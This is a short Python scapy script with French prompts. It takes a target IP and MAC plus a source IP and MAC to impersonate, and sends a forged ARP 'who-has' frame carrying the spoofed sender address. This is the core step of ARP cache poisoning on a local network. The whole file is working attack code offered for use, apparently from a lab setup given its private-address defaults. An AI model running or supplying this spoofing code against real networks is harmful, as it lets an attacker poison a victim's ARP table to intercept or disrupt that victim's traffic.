#!/usr/local/bin/ipython3
from scapy.all import *
from uuid import getnode as get_mac
#####
#Vars
#####
binsrcmac = get_mac()

ip_cible = input("ip cible : ")
if not ip_cible:
    ip_cible = '192.168.10.20'

mac_cible = input("mac cible : ")
if not mac_cible:
    mac_cible = '00:0c:29:d3:17:fc'

mac_src = input("mac source : ")
if not mac_src:
    mac_src = '08:00:27:f0:e4:a8'

ip_src = input("ip src : ")
if not ip_src:
    ip_src = '192.168.10.9'


sendp(Ether(dst=mac_cible)/ARP(op="who-has", hwsrc=mac_src, psrc=ip_src, pdst=ip_cible))
print(ip_src)
